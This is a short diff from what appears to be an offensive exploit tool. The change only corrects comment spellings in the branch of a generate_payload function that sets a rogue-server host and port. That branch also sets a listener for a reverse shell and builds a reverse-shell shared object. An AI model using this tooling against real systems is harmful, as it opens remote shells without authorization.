@@ -155,9 +155,9 @@ def generate_payload(passwd,mode):
         cmd=generate_info(passwd)
     
     elif mode==5:
-        lhost="192.168.1.100" # rouge-server host
-        lport="6666" # rouge-server port
-        revhost="192.168.1.100" #host waiting for reverseshell
+        lhost="192.168.1.100" # rogue-server host
+        lport="6666" # rogue-server port
+        revhost="192.168.1.100" #host waiting for revshell
         revport="6667" #port on host waiting for revshell
         
         cmd=generate_reverse_so(lhost,lport,revhost,revport,passwd)     
